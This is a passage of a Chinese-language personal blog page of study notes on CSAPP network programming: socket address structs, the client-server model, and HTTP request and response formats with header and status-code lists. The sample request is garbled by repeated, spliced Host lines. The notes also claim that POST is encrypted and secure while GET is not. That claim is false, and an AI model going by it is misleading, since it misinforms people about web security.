     <span class="keyword">sizeof</span> (<span class="keyword">sa_family_t</span>) -</span><br><span class="line">                           <span class="keyword">sizeof</span> (<span class="keyword">in_port_t</span>) -</span><br><span class="line">                           <span class="keyword">sizeof</span> (struct in_addr)]; <span class="comment">// sin_zero[8]</span></span><br><span class="line">    <span class="comment">/* Pad to sizeof(struct sockaddr) */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> <span class="keyword">in_addr_t</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span>  &#123;</span></span><br><span class="line">     <span class="keyword">in_addr_t</span>   s_addr;            <span class="comment">/* IPv4 address */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>该结构体解决了 sockaddr 的缺陷，把 port 和 addr 分开储存在两个变量中 </p>
<p><strong>IPv6：struct sockaddr_in6，28个字节</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in6</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint16_t</span>    sin6_family;      <span class="comment">/* AF_INET6 */</span></span><br><span class="line">    <span class="keyword">uint16_t</span>    sin6_port;        <span class="comment">/* Transport layer port # */</span></span><br><span class="line">    <span class="keyword">uint32_t</span>    sin6_flowinfo;    <span class="comment">/* IPv6 flow information */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in6_addr</span> <span class="title">sin6_addr</span>;</span>    <span class="comment">/* IPv6 address */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> sin6_scope_id;       <span class="comment">/* IPv6 scope-id */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in6_addr</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="keyword">uint8_t</span> u6_addr8[<span class="number">16</span>];</span><br><span class="line">        <span class="keyword">uint16_t</span> u6_addr16[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">uint32_t</span> u6_addr32[<span class="number">4</span>];</span><br><span class="line">    &#125; in6_u;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> s6_addr                 in6_u.u6_addr8</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> s6_addr16               in6_u.u6_addr16</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> s6_addr32               in6_u.u6_addr32</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="服务器简析"><a href="#服务器简析" class="headerlink" title="服务器简析"></a>服务器简析</h2><p>每个网络应用都是基于客户端—服务器模型的，釆用这个模型，一个应用是由 <strong>一个服务器进程</strong> 和一个或者多个 <strong>客户端</strong> 进程组成 </p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1646286501329-1646657383406-1646808754597-1646808862603.png" class width="1646286501329"> 
<p>个客户端—服务器事务由以下四步组成：</p>
<ol>
<li>当一个客户端需要服务时，它向服务器发送一个请求，发起一个事务，例如，当 Web 浏览器需要一个文件时，它就发送一个请求给 Web 服务器</li>
<li>服务器收到请求后，解释它，并以适当的方式操作它的资源，例如，当 Web 服务器收到浏览器发出的请求后，它就读一个磁盘文</li>
<li>服务器给客户端发送一个响应，并等待下一个请求，例如，Web 服务器将文件发送回客户端</li>
<li>客户端收到响应并处理它，例如，当 Web 浏览器收到来自服务器的一页后，就在屏幕上显示此页</li>
</ol>
<h2 id="服务器请求"><a href="#服务器请求" class="headerlink" title="服务器请求"></a>服务器请求</h2><p>一般的请求消息如下代码所示：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET /home.html HTTP/1.0 <span class="comment">&lt;!-- 请求消息行 --&gt;</span></span><br><span class="line">Accept: */* <span class="comment">&lt;!-- 请求消息头 --&gt;</span></span><br><span class="line">Host: localhost:GET /home.html HTTP/1.0</span><br><span class="line">Accept: */*</span><br><span class="line">Host: localhost:GET /home.html HTTP/1.0</span><br><span class="line">Accept: */*</span><br><span class="line">Host: localhost:</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3</span><br><span class="line">Connection: close</span><br><span class="line">Proxy-Connection: close</span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> <span class="comment">&lt;!-- 消息正文 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">align</span>=<span class="string">&quot;middle&quot;</span> <span class="attr">src</span>=<span class="string">&quot;godzilla.gif&quot;</span>&gt;</span></span><br><span class="line">Dave O&#x27;Hallaron</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>请求消息行：请求消息的第一行为请求消息行</p>
<ul>
<li>例如：GET  /test/test.html  HTTP/1.1</li>
<li>GET 为请求方式，请求方式分为：Get（默认）、POST、DELETE、HEAD等<ul>
<li>GET：明文传输 不安全，数据量有限，不超过1kb</li>
<li>POST：暗文传输，安全，数据量没有限制</li>
</ul>
</li>
<li>/test/test.html 为URI，统一资源标识符</li>
<li>HTTP/1.1 为协议版本</li>
</ul>
</li>
<li><p>请求消息头：从第二行开始到空白行统称为请求消息头</p>
<ul>
<li>Accept：浏览器可接受的MIME类型告诉服务器客户端能接收什么样类型的文件</li>
<li>Accept-Charset：浏览器通过这个头告诉服务器，它支持哪种字符集</li>
<li>Accept-Encoding：浏览器能够进行解码的数据编码方式，比如 gzip</li>
<li>Accept-Language：浏览器所希望的语言种类，当服务器能够提供一种以上的语言版本时要用到，可以在浏览器中进行设置</li>
<li>Host：初始URL中的主机和端口</li>
<li>Referrer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面</li>
<li>Content-Type：内容类型告诉服务器浏览器传输数据的MIME类型，文件传输的类型</li>
<li>If-Modified-Since：利用这个头与服务器的文件进行比对，如果一致，则从缓存中直接读取文件</li>
<li>User-Agent：浏览器类型</li>
<li>Content-Length：表示请求消息正文的长度</li>
<li>Connection：表示是否需要持久连接。如果服务器看到这里的值为“Keep -Alive”，或者看到请求使用的是HTTP 1.1（HTTP 1.1默认进行持久连接）</li>
<li>Cookie：用于分辨两个请求是否来自同一个浏览器，以及保存一些状态信息</li>
<li>Date：请求时间GMT</li>
</ul>
</li>
<li><p>消息正文：当请求方式是[POST]方式时，才能看见消息正文，消息正文就是要传输的一些数据，如果没有数据需要传输时，消息正文为空</p>
</li>
</ul>
<h2 id="服务器响应"><a href="#服务器响应" class="headerlink" title="服务器响应"></a>服务器响应</h2><p>一般的响应如下代码所示：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK <span class="comment">&lt;!-- 响应消息行 --&gt;</span></span><br><span class="line">Server: Tiny Web Server <span class="comment">&lt;!-- 响应消息头 --&gt;</span></span><br><span class="line">Content-length: 120</span><br><span class="line">Content-type: text/html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> <span class="comment">&lt;!-- 响应正文 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">align</span>=<span class="string">&quot;middle&quot;</span> <span class="attr">src</span>=<span class="string">&quot;godzilla.gif&quot;</span>&gt;</span></span><br><span class="line">Dave O&#x27;Hallaron</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<ul>
<li>响应消息行：第一行响应消息为响应消息行<ul>
<li>例如：HTTP/1.0 200 OK</li>
<li>HTTP/1.0 为协议版本</li>
<li>200 为响应状态码，常用的响应状态码有40余种，这里我们仅列出几种，详细请看：<ul>
<li>200：一切正常</li>
<li>302/307：临时重定向</li>
<li>304：未修改，客户端可以从缓存中读取数据，无需从服务器读取</li>
<li>404：服务器上不存在客户端所请求的资源</li>
<li>500：服务器内部错误</li>
</ul>
</li>
<li>OK 为状态码描述</li>
</ul>
</li>
<li>响应消息头：<ul>
<li>Location：指示新的资源的位置通常和302/307一起使用，完成请求重定向</li>
<li>Server：指示服务器的类型</li>
<li>Content-Encoding：服务器发送的数据采用的编码类型</li>
<li>Content-Length：告诉浏览器正文的长度</li>
<li>Content-Language：服务发送的文本的语言</li>
<li>Content-Type：服务器发送的内容的MIME类型</li>
<li>Last-Modified：文件的最后修改时间</li>
<li>Refresh：指示客户端刷新频率，单位是秒</li>
<li>Content-Disposition：指示客户端下载文件</li>
<li>Set-Cookie：服务器端发送的Cookie</li>
<li>Expires：-1</li>
<li>Cache-Control：no-cache (1.1)  </li>
<li>Pragma：no-cache   (1.0)  表示告诉客户端不要使用缓存</li>
<li>Connection：close/Keep-Alive   </li>
<li>Date：请求时间</li>
</ul>
</li>
<li>响应正文：即网页的源代码（F12可查看）</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/24/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/24/">24</a><span class="page-number current">25</span><a class="page-number" href="/page/26/">26</a><a class="extend next" rel="next" href="/page/26/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">256</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">143</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">3.5m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">52:25</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
